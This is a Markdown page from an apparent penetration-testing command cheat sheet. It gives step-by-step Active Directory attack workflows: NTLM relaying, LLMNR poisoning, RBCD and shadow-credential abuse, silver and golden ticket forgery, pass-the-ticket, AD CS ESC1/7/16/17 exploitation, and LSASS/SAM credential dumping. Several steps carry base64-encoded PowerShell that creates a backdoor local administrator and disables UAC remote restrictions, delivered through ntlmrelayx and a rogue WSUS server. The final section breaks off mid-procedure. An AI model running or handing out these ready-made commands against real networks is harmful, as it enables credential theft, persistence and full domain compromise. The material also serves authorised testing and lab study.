---
title: "Active Directory Techniques"
category: commands
order: 40
description: "Active Directory attack techniques and multi-step workflows."
tags: [ad, windows]
---

## 1. Network attacks

### mitm6: IPv6 DNS takeover

Utilize mitm6 with ntlmrelayx to perform an IPv6 DNS takeover attack in an Active Directory environment.

{% raw %}
```bash
##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it won't work if the AD environment is not using IPv6

##### REFERENCE:
# https://github.com/dirkjanm/mitm6

##### START EXPLOITATION

# Step 1: run the following command on shell 1
# This command relays captured NTLMv2 credentials over IPv6 to an LDAPS server (often the DC), pretending to be part of the domain testfakepad.§DOMAIN§.§ROOTDNS§, and stores any looted data in the 'loot' folder.
ntlmrelayx.py -6 -t ldaps://§RHOST§ -wh testfakepad.§DOMAIN§.§ROOTDNS§ -l loot

# Step 2. run the following command on shell 2
mitm6 -d §DOMAIN§.§ROOTDNS§

# Step 3. if both commands are running, reboot a workstation of the active directory domain, you will shortly after see a result
...

##### END EXPLOITATION
```
{% endraw %}

### LLMNR poisoning attack

Use 'responder' to perform LLMNR poisoning in an Active Directory environment.

{% raw %}
```bash
##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it won't work if LLMNR and NBT-NS is disabled in the network

##### REFERENCE:
# https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/

##### START EXPLOITATION

# Step 1: setup responder to capture the hashes (make sure SMB and HTTP are disabled in responder.conf)
responder -I §NIC§ -Pv

# Step 2: generate traffic, by navigating to a share that does not exist from 1 of the workstations
...

##### END EXPLOITATION
```
{% endraw %}

### SMB-relay attack

Use 'ntlmrelayx' with responder to perform SMB relay attacks in an Active Directory environment.

{% raw %}
```bash
##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it requires targets that have SMB signing disabled (or enabled but not required)
# CANNOT BE RAN IF RESPONDER IS RUNNING SIMULTANEOUSLY WITH SMB ENABLED

##### REFERENCE:
# https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/

##### START EXPLOITATION

### ----- INIT RESPONDER ----- ###
# 1. start responder for capturing NTLMv2 hashes (make sure SMB is DISABLED)
responder -I §NIC§ -Pv

# NOW ALL NTLMv2 HASHES THAT ARE CAPTURED WILL BE RELAYED ONCE NTLMRELAYX IS STARTED

### ----- INIT SMB-RELAY ----- ###
# 1. scan the host to check if smb signing is disabled (or enabled but not required)
nmap --script=smb2-security-mode.nse -p445 §RHOST§

# 2. create a targets.txt file with hosts that have smb signing disabled (or enabled but not required) - one ip-address per line
...

# 3. setup ntlmrelayx.py to relay the captured hashes to the targets and execute a command
sudo ntlmrelayx.py -tf targets.txt -smb2support --no-http-server # this will dump the SAM hashes

##### ALTERNATIVES
# A. add a the account 'tempUserG:DiffPword951' to the system, then add tempUserG account to the local admin group && disable remote UAC restrictions (privileged admin)
sudo ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -c "powershell -enc bgBlAHQAIAB1AHMAZQByACAAIgB0AGUAbQBwAFUAcwBlAHIARwAiACAAIgBEAGkAZgBmAFAAdwBvAHIAZAA5ADUAMQAiACAALwBhAGQAZAAgADsAIABuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIAAiAHQAZQBtAHAAVQBzAGUAcgBHACIAIAAvAGEAZABkACAAOwAgAHIAZQBnACAAYQBkAGQAIAAiAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAiACAALwB2ACAATABvAGMAYQBsAEEAYwBjAG8AdQBuAHQAVABvAGsAZQBuAEYAaQBsAHQAZQByAFAAbwBsAGkAYwB5ACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAxACAALwBmAA=="

##### END EXPLOITATION
```
{% endraw %}

### ntlmrelayx - smb relay (with coerce/ coercion)

Use 'ntlmrelayx' with nxc coerce_plus module to perform SMB relay attacks in an Active Directory environment.

{% raw %}
```bash
##### DESCRIPTION
# In order to perform an SMB relay attack with coercion, you can use ntlmrelayx with the coerce_plus module of nxc. This will allow you to coerce a target machine to authenticate to you, which will then add a computer account to the domain, add delegation rights to that account and allow it to impersonate users on the target system via S4U2Proxy.

##### REQUIREMENTS:
# - LDAP signing and channel binding must be disabled/not enforced on the DC
# - Machine Account Quota (MAQ) > 0 to create a new computer account (default: 10)
# - LDAPS must be available on the DC (computer account creation requires encryption)
# - You can only configure RBCD on the machine whose authentication you relay (SELF write access)
# - The user to impersonate must not be in Protected Users or have the "sensitive and cannot be delegated" flag

##### REFERENCE:
# https://labs.jumpsec.com/ntlm-relaying-making-the-old-new-again/ - # LDAP Signing - RBCD

##### START EXPLOITATION
# 1. Check if ldap signing is disabled on the target (DC) and if MAQ > 0
nxc ldap §DOMAIN§.§ROOTDNS§ -u '§USERNAME§' -p '§PASSWORD§' -M maq

# 2. setup impacket-ntlmrelayx
impacket-ntlmrelayx -t ldaps://§DOMAIN§.§ROOTDNS§ --delegate-access --remove-mic -smb2support

# 3. Coerce target machine to authenticate to us (separate terminal), this will add a computer account to the domain, add delegation rights to that account and allow it to impersonate users on the target system via S4U2Proxy
nxc smb {{TARGET_HOST}} -u '§USERNAME§' -p '§PASSWORD§' -d '§DOMAIN§'.'§ROOTDNS§' -M coerce_plus -o LISTENER=§LHOST§

# Expected output from ntlmrelayx:
# [*] (SMB): Authenticating against ldaps://§DOMAIN§.§ROOTDNS§ SUCCEED
# [*] Adding new computer with username: XXXXXXXX$ and password: YYYYYYYY result: OK
# [*] Delegation rights modified succesfully!
# [*] XXXXXXXX$ can now impersonate users on {{TARGET_NAME}}$ via S4U2Proxy

# 4. Note the created computer account and password from output, then request A service ticket
impacket-getST -spn 'cifs/{{target_hostname}}.§DOMAIN§.§ROOTDNS§' -impersonate "Administrator" '§DOMAIN§'/'{{NEW_COMPUTER}}$':'{{NEW_PASSWORD}}' -dc-ip §RHOST§

# once the kerberos ticket is retrieved, you can impersonate the administrator user on the target system (for example:)
export KRB5CCNAME=Administrator@{{target_hostname}}.§DOMAIN§.§ROOTDNS§@§DOMAIN§.§ROOTDNS§.ccache
nxc smb {{target_hostname}} --use-kcache
psexec.py -k {{target_hostname}}.§DOMAIN§.§ROOTDNS§

##### END EXPLOITATION
```
{% endraw %}

## 2. Permission attacks

### Resource-based Constrained Delegation (RBCD) impacket

Use 'impacket' to perform Resource-based Constrained Delegation (RBCD) attack in Active Directory.

{% raw %}
```bash
##### REQUIREMENTS:
- "Generic all" permission on the target object (e.g. computer account)

##### REFERENCE:
https://www.hackingarticles.in/genericall-active-directory-abuse/

##### START exploitation

# step 1: Abuse 'MachineAccountQuota' to create a computer account
addcomputer.py -method SAMR -dc-ip §RHOST§ -computer-pass MachinePassTest321 -computer-name machineAccountTest §DOMAIN§.§ROOTDNS§/§USERNAME§:'§PASSWORD§'

# step 2: Rewrite DC's 'AllowedToActOnBehalfOfOtherIdentity' properties
rbcd.py §DOMAIN§.§ROOTDNS§/§USERNAME§:'§PASSWORD§' -action write -delegate-to '§HOSTNAME§$' -delegate-from 'machineAccountTest$' -dc-ip §RHOST§

# step 3: generate a service ticket for CIFS
getST.py §DOMAIN§.§ROOTDNS§/'machineAccountTest$':MachinePassTest321 -spn cifs/§HOSTNAME§.§DOMAIN§.§ROOTDNS§ -impersonate administrator -dc-ip §RHOST§

# step 4: export the .ccache file for kerberos authentication
export KRB5CCNAME=$(pwd)/administrator@cifs_§HOSTNAME§.§DOMAIN§.§ROOTDNS§@§DOMAIN§.§ROOTDNS§.ccache

# step 5: exploit as the administrator user
psexec.py §DOMAIN§.§ROOTDNS§/administrator@§HOSTNAME§.§DOMAIN§.§ROOTDNS§ -k -no-pass -dc-ip §RHOST§
secretsdump.py §DOMAIN§.§ROOTDNS§/administrator@§HOSTNAME§.§DOMAIN§.§ROOTDNS§ -k -no-pass -dc-ip §RHOST§

##### END exploitation
```
{% endraw %}

### owns permissions

Use 'dacledit.py' and 'net rpc' to exploit 'owns' permissions in Active Directory.

{% raw %}
```bash
##### REQUIREMENTS:
- "Owns" permissions on the target object (e.g. target group)

##### REFERENCE:
# N/A

##### START exploitation

# step 1: grant yourself the 'WriteMembers' permission on a target group, so you can add yourself to that group
dacledit.py -action 'write' -rights 'WriteMembers' -principal '<user_that_gets_writemembers_permission>' -target-dn 'CN=<GROUP>,CN=<USERS>,DC=§DOMAIN§,DC=§ROOTDNS§' '§DOMAIN§.§ROOTDNS§'/'§USERNAME§':'§PASSWORD§'

# step 2: add the target user to the target group
net rpc group addmem "<GROUP>" "§USERNAME§" -U '§DOMAIN§.§ROOTDNS§'/'§USERNAME§'%'§PASSWORD§' -S "§DOMAIN§.§ROOTDNS§"

##### END exploitation
```
{% endraw %}

### GenericAll permissions # shadow credentials

Use 'pywhisker' to exploit 'Genericall' permissions in Active Directory.

{% raw %}
```bash
##### REQUIREMENTS:
- "GenericAll" permissions on the target object (e.g. target group)

##### REFERENCE:
# https://www.hackingarticles.in/shadow-credentials-attack/

##### START exploitation
# OPTION 1 - utilizing certipy shadow auto
certipy shadow auto -u '§USERNAME§'@'§DOMAIN§.§ROOTDNS§' -p '§PASSWORD§' -account '<target_account>'

# OPTION 2 - ALL STEPS: To abuse the 'GenericAll' permissions use pywhisker

# step 1. add a new shadow credential to the target account
pywhisker.py -d "§DOMAIN§.§ROOTDNS§" -u "§USERNAME§" -p "§PASSWORD§" --target "<targetAccount>" --action "add"

# step 2. verify the shadow credentials have been added
pywhisker.py -d "§DOMAIN§.§ROOTDNS§" -u "§USERNAME§" -p "§PASSWORD§" --target "<targetAccount>" --action "list"

# step 3. retrieve the 'aes' key of the shadow credential
gettgtpkinit.py -cert-pfx "<CERT.pfx>" -pfx-pass <pfx-pass> §DOMAIN§.§ROOTDNS§/<targetAccount> <targetAccount>.ccache

# step 4. export the .ccache file for kerberos authentication
export KRB5CCNAME=$(pwd)/<targetAccount>.ccache

# step 5. get the hash of the user
getnthash.py -key <aes-hash> §DOMAIN§.§ROOTDNS§/<targetAccount>

##### END exploitation
```
{% endraw %}

## 3. Ticket attacks

### generate TGT ticket with Rubeus

Use 'rubeus.exe' to retrieving a usable TGT ticket from a compromised account and authenticating with Kerberos from the attacker machine.

{% raw %}
```bash
##### REQUIREMENTS:
- Rubeus.exe must be available on the target host
- Shell access to the target host

##### START exploitation

# 1. execute rubeus, retrieve the TGT of the current user
.\Rubeus.exe tgtdeleg /nowrap

# 2. copy the content from the terminal and save it to the file "ticket.enc.kirbi" by hand
...

# 3. cat the content, base64 decode it, save it as "ticket.dec.kirbi"
cat ticket.enc.kirbi | base64 -d > ticket.dec.kirbi

# 4. use ticketConverter.py to create the .ccache file
ticketConverter.py ticket.dec.kirbi ticket.ccache

# 5. use it for kerberos authentication
EXPORT KRB5CCNAME=$(pwd)/ticket.ccache

# 6.  use klist to verify the ticket
klist ticket.ccache

# 7. authenticate to the target service using the TGT ticket
psexec.py -k §HOSTNAME§.§DOMAIN§.§ROOTDNS§
secretsdump.py -k §HOSTNAME§.§DOMAIN§.§ROOTDNS§

##### END exploitation
```
{% endraw %}

### Silver ticket attack

Use 'ticketer.py' to retrieve a silver ticket as the 'service administrator user'

{% raw %}
```bash
##### REQUIREMENTS:
- SPN password hash of the service account
- Domain SID
- SPN of the service account

##### DESCRIPTION
# A silver ticket attack forges a TGS ticket using the NTLM hash of a service account, granting full access to that service and any other service using the same SPN.

###
### --- SCENARIO 1: MSSQL SERVICE
###

# In this scenario, we have access to a mssql service as the user 'svc_mssql' and we want to impersonate the administrator user on the mssql service (cannot be used as cifs).
# When we authenticate normally to the mssql service with a username/password combination, we don't have access to xp_cmdshell (or config)
# We can use ticketer.py to create a silver ticket for the administrator user on the mssql service and enable xp_cmdshell - Kerberos interprets this wrong and allows it.

##### REFERENCE: (Chapter: Impersonate Administrator via silver ticket)
https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f

##### START exploitation

# 1. create a silver ticket for the administrator user on the mssql service
ticketer.py -nthash '§HASH§' -domain-sid '§DOMAIN-SID§' -domain '§DOMAIN§'.'§ROOTDNS§' -spn <SA_USER_SPN> -user-id 500 Administrator 

# 2. export the .ccache file for kerberos authentication
export KRB5CCNAME=$(pwd)/Administrator.ccache

# 3. verify the ticket using klist
klist

# 4. connect with kerberos to the mssql service
mssqlclient.py -k -no-pass §HOSTNAME§.§DOMAIN§.§ROOTDNS§

# 5. enable xp_cmdshell and execute a command as the mssql_svc account
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

xp_cmdshell whoami /all

# 6. return a reverse shell
...

##### END exploitation

###
### --- SCENARIO 2: HTTP SERVICE
###
# In this scenario, we have access to the service account 'iis_service'. The http server says that access is denied since we don't have enough privileges.
# triggering the silver ticket attack will allow us to authenticate as the administrator user on the http service.

##### REFERENCE:
# OSCP COURSE: chapter 23

##### START exploitation

# 1. create a silver ticket for the administrator user on the http service
ticketer.py -nthash §HASH§ -domain-sid '§DOMAIN-SID§' -domain '§DOMAIN§'.'§ROOTDNS§' -spn '<SA_USER_SPN>' -user-id 500 Administrator

# 2. export the .ccache file for kerberos authentication
export KRB5CCNAME=$(pwd)/Administrator.ccache

# 3. verify the ticket using klist
klist

# 4. authenticate to the http service using the silver ticket
curl -v --negotiate -u : http://§HOSTNAME§.§DOMAIN§.§ROOTDNS§

### --- START IMPORTANT --- ###

# ServicePrincipalName  
----------------------
HTTP/web04.corp.com   
HTTP/web04             
HTTP/web04.corp.com:80 

# if the request fails, regenerate the silver ticket with a different SPN of the same user (if available) then create the silver ticket with either of these SPNs & repeat from step 2
ticketer.py -nthash 4d28cf5252d39971419580a51484ca09 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com -spn 'HTTP/web04' -user-id 500 Administrator # fails
ticketer.py -nthash 4d28cf5252d39971419580a51484ca09 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com -spn 'HTTP/web04.corp.com' -user-id 500 Administrator # success 

### --- END IMPORTANT --- ###

##### END exploitation
```
{% endraw %}

### Golden ticket attack

Use 'ticketer.py' to generate a golden ticket for unrestricted access to the entire Active Directory domain.

{% raw %}
```bash
##### REQUIREMENTS:
# - password hash of the krbtgt account
# - Domain SID

##### DESCRIPTION
# A golden ticket attack gives you unrestricted access to the entire Active Directory domain by forging a TGT ticket using the NTLM hash of the krbtgt account.

##### REFERENCE:
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden

##### START exploitation

# 1. generate a ticket using the hash of the krbtgt account
ticketer.py -nthash '§HASH§' -domain-sid '{{DOMAIN_SID}}' -domain '§DOMAIN§'.'§ROOTDNS§' 'Administrator'

# 2. export the .ccache file for kerberos authentication
export KRB5CCNAME=$(pwd)/Administrator.ccache

# 3. verify the ticket using klist
klist

# 4. authenticate to the target service using the golden ticket
psexec.py -k '§HOSTNAME§'.'§DOMAIN§'.'§ROOTDNS§' -dc-ip §RHOST§

##### END exploitation
```
{% endraw %}

### Golden ticket attack - RODC

Use multiple tools to generate a golden ticket for a RODC, and retrieve the administrator hash

{% raw %}
```bash
##### REQUIREMENTS:
# - Administrative access to the RODC
# - AES256_hmac hash of the krbtgt account (krbtgt_xxxx) on the RODC
# - Permissions to clear the RODCs deny list and add the administrator user to the allow list of the RODC
# - Domain SID
# - RODC number

##### DESCRIPTION
# A golden ticket attack on a RODC is a bit different than a normal golden ticket attack, since you need to first clear the deny list of the RODC and add the administrator user to the allow list of the RODC. Then you can forge a golden ticket for the RODC and retrieve the administrator hash by requesting a TGS ticket for the krbtgt service.

##### REFERENCE:
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/rodc-golden-tickets
https://www.thehacker.recipes/ad/movement/credentials/dumping/kerberos-key-list

##### START exploitation

# set the .ccache file of the RODC admin account
export KRB5CCNAME=administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache

# 1. using nxc, upload mimikatz
nxc smb RODC01.§DOMAIN§.§ROOTDNS§ -k --use-kcache --put-file mimikatz.exe '/users/administrator/desktop/mimikatz.exe'

# 2. execute the mimikatz module 'lsa /inject' and take note of the krbtgt_xxxx AES256_hmac hash
nxc smb RODC01.§DOMAIN§.§ROOTDNS§ -k --use-kcache -x 'C:\Users\Administrator\desktop\mimikatz.exe "privilege::debug" "lsadump::lsa /inject" exit'

# 3. hash retrieved for the krbtgt_xxxx, account (RODCX), For example:
aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240

# 4. clear the 'msDS-NeverRevealGroup' object and add the administrator object tot the 'msDS-RevealOnDemandGroup'. Then check the values
# msDS-NeverRevealGroup - The RODC's deny list: principals whose credentials are never allowed to be cached. Takes precedence over the allow list.
# msDS-RevealOnDemandGroup - The RODC's allow list: principals whose credentials are allowed to be cached for local authentication.
Set-ADcomputer RODC01 -Clear msDS-NeverRevealGroup
Set-ADComputer RODC01 -Add @{'msDS-RevealOnDemandGroup' = 'CN=Administrator,CN=Users,DC=§DOMAIN§,DC=§ROOTDNS§'}
Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup

# 5. upload rubeus.exe on a domain-joined computer (use rubeus 4.7 or above) - https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
nxc smb §HOSTNAME§.§DOMAIN§.§ROOTDNS§ -k --use-kcache --put-file Rubeus.exe '/users/administrator/desktop/rubeus.exe'

# 6. forge a RODC golden ticket using the krbtgt_xxxx file hash, and save the ticket as a .kirbi file
.\Rubeus.exe golden /rodcNumber:<KRBTGT_NUMBER> /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:<KRBTGT_HMAC_256_AES_KEY> /user:Administrator /id:500 /domain:§DOMAIN§.§ROOTDNS§ /sid:§DOMAIN-SID§

# 7. request the administrator hash
.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/§DOMAIN§.§ROOTDNS§ /dc:§HOSTNAME§.§DOMAIN§.§ROOTDNS§ /ticket:generated_ticket_.kirbi /nowrap

# Administrator hash EXAMPLE
2B576ACBE6BCFDA7294D6BD18041B8FE

# 8. once the administrator hash is retrieved, you can use other tools like evil-winrm or psexec.py to logon to the domain controller as "administrator" user
evil-winrm -i §RHOST§ -u §USERNAME§ -H §HASH§

##### END exploitation
```
{% endraw %}

### PTT (pass the ticket attack)

use PTT (pass the ticket) to authenticate with a forged Kerberos ticket in an Active Directory environment.

{% raw %}
```bash
##### REQUIREMENTS:
# - Access to TGT or TGS ticket in .kirbi or .ccache format

##### DESCRIPTION
# A pass the ticket (PTT) attack involves using a forged Kerberos ticket to authenticate to services within an Active Directory environment without needing the user's password. One manner on retrieving such a ticket is through the lsassy module of nxc

##### REFERENCE:
# https://www.thehacker.recipes/ad/movement/kerberos/ptt

##### START exploitation

# 1. dump the LSASS memory, retrieve all TGT/TGS and NTLM hashes
nxc smb §RHOST§ -u '§USERNAME§' -p '§PASSWORD§' -d '§DOMAIN§'.'§ROOTDNS§' -M lsassy

# 2. all TGS/TGT tickets will be saved in '~/.nxc/modules/lsassy'
...

# 3. select a TGT file, and export the KRB5CCNAME to make use of the TGT file
export KRB5CCNAME=$(pwd)/{{TGT_FILE}}

# 4. verify if the ticket is loaded
klist

# 5. authenticate to the target service using the ticket
nxc smb 192.168.242.0/24 -u dave --use-kcache

# 6. alternatively, use impacket tools to authenticate using the ticket
psexec.py -k '§HOSTNAME§'.'§DOMAIN§'.'§ROOTDNS§'

# SMB
smbclient.py -k -no-pass '§HOSTNAME§'.'§DOMAIN§'.'§ROOTDNS§'

# list shares: shares
# connect to share: use <sharename>

##### END exploitation
```
{% endraw %}

## 4. Certificate attacks

### Ticket attacks (certipy)

Use 'certipy' to scan for vulnerable Active Directory Certificate Services (AD CS)

{% raw %}
```bash
##### REQUIREMENTS:
# it is verified that the CA is vulnerable to the ESC1 template attack, utilizing the following command:
certipy find -u '§USERNAME§@§DOMAIN§.§ROOTDNS§' -p '§PASSWORD§' -dc-ip §RHOST§ -vulnerable -enabled

##### reference:
# https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san

##### START exploitation
# the following parameters (-ca, -template) can be found in the certipy scan output
# -ca (name of the domain CA)
# -template (name of the vulnerable template)
# -upn (name of the account in e-mail format, e.g: adminstrator@domain.local)

# step 1: request a certificate using the vulnerable template for the administrator user
certipy req -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p "§PASSWORD§" -dc-ip "§RHOST§" -target "§RHOST§" -ca 'ca_name' -template 'vulnerable template' -upn 'administrator@§DOMAIN§.§ROOTDNS§'

# for example:
certipy # certipy req -u "Ryan.Cooper@sequel.htb" -p "NuclearMosquito3" -dc-ip "10.129.228.253" -target "10.129.228.253" -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'administrator@sequel.htb'

# returns the administrator.pfx file in the current directory

# step 2: set the time (for time synchronization - exegol security distribution)
faketime "$(rdate -n §RHOST§ -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

# step 3: retrieve the administrator NTLM hash directly
certipy auth -pfx "administrator.pfx" -dc-ip '§RHOST§' -username 'administrator' -domain '§DOMAIN§.§ROOTDNS§'

# step 4: save the NTLM hash and execute the secretsdump/psexec etc. command
...

##### END EXPLOITATION
```
{% endraw %}

### Ticket attacks (certipy)

Use 'certipy-ad' to scan for vulnerable Active Directory Certificate Services (AD CS)

{% raw %}
```bash
##### REQUIREMENTS:
# it is verified that the CA is vulnerable to the ESC7 template attack, utilizing the following command:
certipy find -u '§USERNAME§@§DOMAIN§.§ROOTDNS§' -p '§PASSWORD§' -dc-ip §RHOST§ -vulnerable -enabled

##### reference:
# https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-abusing-subca
# https://www.rbtsec.com/blog/active-directory-certificate-attack-esc7/

##### START exploitation
# the following parameters (-ca, -template) can be found in the certipy scan output
# -ca (name of the domain CA)
# -template (name of the vulnerable template)
# -upn (name of the account in e-mail format, e.g: adminstrator@domain.local)

# add a new officer (grant the user the 'Manage Certificates' rights)
certipy ca -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p '§PASSWORD§' -dc-ip "§RHOST§" -ca '§CA-NAME§' -add-officer '§USERNAME§'

# OPTIONAL
# display enabled certificate template
certipy ca -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p '§PASSWORD§' -dc-ip "§RHOST§" -ca '§CA-NAME§' -list-templates

# Enable SubCa certificate template
certipy ca -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p '§PASSWORD§' -dc-ip "§RHOST§" -ca '§CA-NAME§' -enable-template 'SubCA'

# issue a request (This will fail, save the key)
certipy req -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p '§PASSWORD§' -target '§HOSTNAME§.§DOMAIN§.§ROOTDNS§' -ca '§CA-NAME§' -template SubCA -upn administrator@§DOMAIN§.§ROOTDNS§ -dc-ip "§RHOST§"

# verify the issues request
certipy ca -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p '§PASSWORD§'  -ca '§CA-NAME§' -target '§HOSTNAME§.§DOMAIN§.§ROOTDNS§' -issue-request <ticket_id> -dc-ip "§RHOST§"

# retrieve the issued request
certipy req -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p '§PASSWORD§' -ca '§CA-NAME§' -dc-ip "§RHOST§" -template SubCA -target '§HOSTNAME§.§DOMAIN§.§ROOTDNS§' -upn administrator@§DOMAIN§.§ROOTDNS§ -retrieve <ticket_id>

# authenticate using the administrator.pfx file, this will retrieve the administrator hash
certipy auth -pfx administrator.pfx

##### END EXPLOITATION
```
{% endraw %}

### Ticket attacks (certipy)

Use 'certipy-ad' to scan for vulnerable Active Directory Certificate Services (AD CS)

{% raw %}
```bash
##### REQUIREMENTS:
# it is verified that the CA is vulnerable to the ESC16 template attack, utilizing the following command (certipy v5.02 or above is needed for ESC16):
certipy find -u '§USERNAME§@§DOMAIN§.§ROOTDNS§' -p '§PASSWORD§' -dc-ip §RHOST§ -vulnerable -enabled

##### REFERENCE
# https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6
# https://youtu.be/KvUC7bakm-E?t=1565
# https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc16-security-extension-disabled-on-ca
# HTB: fluffy

##### START EXPLOITATION

# 1. read the UPN (account with permissions over the '<ca_account>' user)
certipy account -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p "§PASSWORD§" -dc-ip "§RHOST§" -user '<ca_account>' read

# 2. update the UPN of the CA account to 'administrator'
certipy account -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p "§PASSWORD§" -dc-ip "§RHOST§" -upn 'administrator' -user '<ca_account>' update

# 3. OPTIONAL: retrieve the NT hash of the '<ca_account>' user (which the updated upn)
# certipy shadow -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p "§PASSWORD§" -dc-ip "§RHOST§" -account '<ca_account>' auto

# 4. request the certificate for the admin user
certipy req -u "<ca_account>@§DOMAIN§.§ROOTDNS§" -hashes "§HASH§" -ca "§CA-NAME§" -template 'User' -upn "Administrator@§DOMAIN§.§ROOTDNS§" -dc-ip "§RHOST§"

# 5. update the UPN again
certipy account -u "§USERNAME§@§DOMAIN§.§ROOTDNS§" -p "§PASSWORD§" -dc-ip "§RHOST§" -upn '<ca_account>@§DOMAIN§.§ROOTDNS§' -user '<ca_account>' update

# 6. authenticate 
certipy auth -dc-ip "§RHOST§" -pfx 'administrator.pfx' -username 'administrator' -domain "§DOMAIN§.§ROOTDNS§"

##### END EXPLOITATION
```
{% endraw %}

### Ticket attacks (certipy)

Use 'certipy' to scan for vulnerable Active Directory Certificate Services (AD CS)

{% raw %}
```bash
##### REQUIREMENTS:
# it is verified that the CA is vulnerable to the ESC17 template attack, utilizing the following command:
certipy find -u '§USERNAME§@§DOMAIN§.§ROOTDNS§' -p '§PASSWORD§' -dc-ip §RHOST§ -vulnerable -enabled

##### REFERENCE:
https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/
https://wither2rebirth.com/reports/htb-Logging

##### START EXPLOITATION
# 1. identify the WSUS server (if possible)
wsuks -u §USERNAME§ -p §PASSWORD§ -d §DOMAIN§.§ROOTDNS§ --dc-ip §RHOST§ --only-discover

# or on the host itself ("UseWUServer" must be "0x1")
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU

# 2. identify a suitable certificate template (ESC-17)
certipy find -u '§USERNAME§@§DOMAIN§.§ROOTDNS§' -p '§PASSWORD§' -dc-ip §RHOST§ -vulnerable -enabled

# 2A. OPTIONAL: add the appropriate DNS record that points to your host as the WSUS server (MUST BE DONE CORRECT IN 1 TIME!)
dnstool -u '§DOMAIN§\§USERNAME§' -p '§PASSWORD§' --record 'A_RECORD_NAME' --action add -t A --data §LHOST§ §RHOST§

# 3. request and convert the certificate
certipy req -dc-ip §RHOST§ -u §USERNAME§ -p §PASSWORD§ -template <template-name> -target §HOSTNAME§.§DOMAIN§.§ROOTDNS§ -ca §CA-NAME§ -dns wsus.§DOMAIN§.§ROOTDNS§

# for usage with wsuks, convert it to pem format
openssl pkcs12 -in <wsus_hostname>.pfx -out <wsus_hostname>.pem -nodes --passin pass:

# 4. intercept the WSUS traffic - execute the command (add local admin user: tempUserG:DiffPword951) - takes some time, depening on WSUS configuration (e.g. update frequency)
wsuks --serve-only --WSUS-Server wsus.§DOMAIN§.§ROOTDNS§ --tls-cert <wsus_hostname>.pem -I §NIC§ -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -enc bgBlAHQAIAB1AHMAZQByACAAIgB0AGUAbQBwAFUAcwBlAHIARwAiACAAIgBEAGkAZgBmAFAAdwBvAHIAZAA5ADUAMQAiACAALwBhAGQAZAAgADsAIABuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIAAiAHQAZQBtAHAAVQBzAGUAcgBHACIAIAAvAGEAZABkACAAOwAgAHIAZQBnACAAYQBkAGQAIAAiAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAiACAALwB2ACAATABvAGMAYQBsAEEAYwBjAG8AdQBuAHQAVABvAGsAZQBuAEYAaQBsAHQAZQByAFAAbwBsAGkAYwB5ACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAxACAALwBmAA=='

# 5. authenticate to WSUS server
evil-winrm -i §HOSTNAME§.§DOMAIN§.§ROOTDNS§ -u tempUserG -p DiffPword951

##### END EXPLOITATION
```
{% endraw %}

## 5. Miscellaneous attacks

### Read .vhd/ .vhdx SAM hashes

{% raw %}
```bash
##### REQUIREMENTS:
# you can reach a .vhd or .vhdx file on a remote share (SMB) or locally

##### reference:
# HTB Bastion box - https://www.youtube.com/watch?v=2j3FNp5pjQ4

##### START exploitation
# step 1: mount the .vhd or .vhdx file (if accessible via SMB share)
mount -t cifs //§RHOST§/<remote_share> <local_mount_folder> -o username=§USERNAME§,password='§PASSWORD§',ro,vers=2.0

